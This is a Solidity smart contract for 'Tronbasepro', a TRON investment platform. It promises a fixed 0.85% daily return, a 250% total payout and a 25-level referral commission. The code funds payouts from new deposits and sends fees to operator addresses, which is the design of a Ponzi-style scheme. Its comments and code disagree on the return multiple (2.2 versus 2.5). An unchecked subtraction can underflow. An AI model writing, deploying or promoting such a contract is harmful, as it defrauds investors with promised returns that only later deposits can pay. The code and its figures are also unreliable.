//SourceUnit: Tronbasepro.sol

/*
 *  
 *   TRONBASEPRO
 *
 *   [INVESTMENT CONDITIONS]
 * 
 *   - Basic interest rate: +0.85% every 24 hours.
 * 
 *   - Minimal deposit: 500 TRX, no maximal limit
 *   - Total income: 250% (deposit included)
 *   - Earnings every moment, withdraw any time
 * 
 *   [AFFILIATE PROGRAM]
 *
 *   Share your referral link with your partners and get additional bonuses.
 *   - 25-level matching referral commission: 20% to 2%
 *   
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 82% Platform main balance, participants payouts
 *	 - 8% Affiliate program bonuses 
 *   - 6% Advertising and promotion expenses
 *   - 4% Support work, technical functioning, administration fee
 *
 *   ────────────────────────────────────────────────────────────────────────
 */

pragma solidity ^0.5.10;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Tronbasepro {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 500 trx;
	uint256 constant public BASE_PERCENT = 85; // 0.85 %
	uint256[] public REFERRAL_PERCENTS = [800]; // 8%
	uint256 constant public MARKETING_FEE = 600; // 6%
	uint256 constant public PROJECT_FEE = 400; // 4%;
	uint256 constant public MIN_WITHDRAW = 200 trx;
	uint256 constant public INCREASE_DEPOSIT_LIMIT = 50000 trx;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public TIME_STEP =  1 days;

	uint256 public maxWithDrawInADay = 15000 trx;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint[] public ref_bonuses = [20,10,5,5,5,5,4,4,4,4,4,3,3,3,3,2,2,2,2,2,2,2,2,2,2]; 

	address payable public marketingAddress;
	address payable public projectAddress;
	address payable public admin;

	

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		bool end;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256 bonus;
		uint256 match_bonus;
		uint256 totalWithdrawn;
		uint256 WithdrawnInADay;
		uint256 remainingWithdrawn;
		uint[25] refs;
	}

	mapping (address => User) public users;
	mapping(address => mapping(uint256=>address)) public downline;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	event MatchPayout(address indexed addr, address indexed from, uint256 amount);

	constructor(address payable marketingAddr, address payable projectAddr, address payable adminAddr) public {
		require(!isContract(marketingAddr) && !isContract(projectAddr) && !isContract(adminAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr;
		admin = adminAddr;
	}


	function _refPayout(address _addr, uint256 _amount) private {
		 address up = users[_addr].referrer;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].refs[0] >= i+1){

					(uint256 to_payout, uint256 max_payout) = this.payoutOf(up);
					
					uint256 bonus = _amount * ref_bonuses[i] / 100;
					uint remain = (max_payout - users[up].totalWithdrawn.add(to_payout));

					bonus = ( remain > 0 ) ? (remain > bonus) ? bonus : remain : 0;

                users[up].match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus);
			}
            up = users[up].referrer;
        }
    }

	function invest(address referrer) public payable {


		
		require(!isContract(msg.sender) && msg.sender == tx.origin);
		require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 500TRX');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].deposits.length > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");

		if(user.deposits.length > 0){
		 uint previousDeposit = user.deposits[user.deposits.length-1].amount;

		 if(previousDeposit <= INCREASE_DEPOSIT_LIMIT)
		 require(msg.value >= previousDeposit.add(previousDeposit.mul(10).div(100)) , "Invalid Deposit!");
		}

		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));

		

		uint msgValue = msg.value;
		if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < REFERRAL_PERCENTS.length; i++) {
                if (upline != address(0)) {


					(uint256 to_payout, uint256 max_payout) = this.payoutOf(upline);
					
					uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					uint remain = (max_payout - users[upline].totalWithdrawn.add(to_payout));

					amount = ( remain > 0 ) ? (remain > amount) ? amount : remain : 0;

						if (amount > 0) {
							users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
							emit RefBonus(upline, msg.sender, i, amount);
						}
					
                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

			downline[referrer][users[referrer].refs[0] - 1]= msg.sender;

        }

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(msg.value, 0, block.timestamp,false));

		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);
		
		emit NewDeposit(msg.sender, msg.value);

	}

	function withdraw() public {

		User storage user = users[msg.sender];
		(uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
		require(to_payout > 0, "User has no dividends");
		require(to_payout >= MIN_WITHDRAW, "Minimum withdraw 200 trx!");

		uint256 currentTime = block.timestamp;
		if(currentTime.sub(user.checkpoint) >= TIME_STEP){
			user.WithdrawnInADay = 0;
		}

		
		require(user.WithdrawnInADay < maxWithDrawInADay, "Maximum withdraw 15000 trx in a day!");



		uint256 userPercentRate = BASE_PERCENT;

		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

				if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(25).div(10)) {

					if (user.deposits[i].start > user.checkpoint) {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.deposits[i].start))
							.div(TIME_STEP);

					} else {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.checkpoint))
							.div(TIME_STEP);

					}

					if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(25).div(10)) {     // Deposited Amount × 22 ÷ 10    // = Deposited Amount × 2.2
						dividends = (user.deposits[i].amount.mul(25).div(10)).sub(user.deposits[i].withdrawn);     // Deposited Amount × 2.2 Times Return
					}                                                                                              // Total Return = 220%

					user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);    // changing of storage data after withdrawal
					totalAmount = totalAmount.add(dividends);

					if(user.totalWithdrawn.add(to_payout) >= max_payout){
						user.deposits[i].withdrawn = user.deposits[i].amount.mul(25).div(10);
					}

				}
			
		}


        if(totalAmount > 0){
		_refPayout(msg.sender,totalAmount);
		}


		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
		}

		uint256 referralMatchingBonus = getUserReferralMatchingBonus(msg.sender);
		if (referralMatchingBonus > 0) {
			user.match_bonus = 0;
		}

		if(user.WithdrawnInADay.add(to_payout) > maxWithDrawInADay){

			uint current_payout = to_payout;
			to_payout = maxWithDrawInADay.sub(user.WithdrawnInADay);
			user.remainingWithdrawn = current_payout.sub(to_payout);

		}else{

			user.remainingWithdrawn = 0;
		}

		



		user.checkpoint = block.timestamp;

		msg.sender.transfer(to_payout);

		user.WithdrawnInADay = user.WithdrawnInADay.add(to_payout);
		user.totalWithdrawn = user.totalWithdrawn.add(to_payout);
		totalWithdrawn = totalWithdrawn.add(to_payout);

		emit Withdrawn(msg.sender, to_payout);

	}



	function updateMaxWithdrawInADay(uint256 _amount) external {
		require(msg.sender == admin, 'permission denied!');
		maxWithDrawInADay =_amount;
    }


	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw,  uint _contractPercent) {
        return (totalUsers, totalInvested, totalWithdrawn, BASE_PERCENT);
    }


	

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate = BASE_PERCENT;

		uint256 totalDividends;
		uint256 dividends;



		for (uint256 i = 0; i < user.deposits.length; i++) {

				if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(25).div(10)) {

					if (user.deposits[i].start > user.checkpoint) {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.deposits[i].start))
							.div(TIME_STEP);

					} else {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.checkpoint))
							.div(TIME_STEP);

					}

					if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(25).div(10)) {
						dividends = (user.deposits[i].amount.mul(25).div(10)).sub(user.deposits[i].withdrawn);
					}

					totalDividends = totalDividends.add(dividends);


				}
			
		}

		return totalDividends;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineInfo(address userAddress, uint index) public view returns(uint256) {
		return users[userAddress].refs[index];
	}

	
    function maxPayoutOf(address userAddress) view external returns(uint256) {
		User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}
        return amount * 25 / 10;
    }

	function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
		User storage user = users[_addr];
        max_payout = this.maxPayoutOf(_addr);


		if(user.totalWithdrawn < max_payout){
			payout = getUserDividends(_addr).add(getUserReferralBonus(_addr)).add(getUserReferralMatchingBonus(_addr)).add(user.remainingWithdrawn);

			if(user.totalWithdrawn.add(payout) > max_payout){
				payout = max_payout.sub(user.totalWithdrawn);
			}
		}

    }

	

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralMatchingBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].match_bonus;
	}

	


	function getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(22).div(10)) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	
}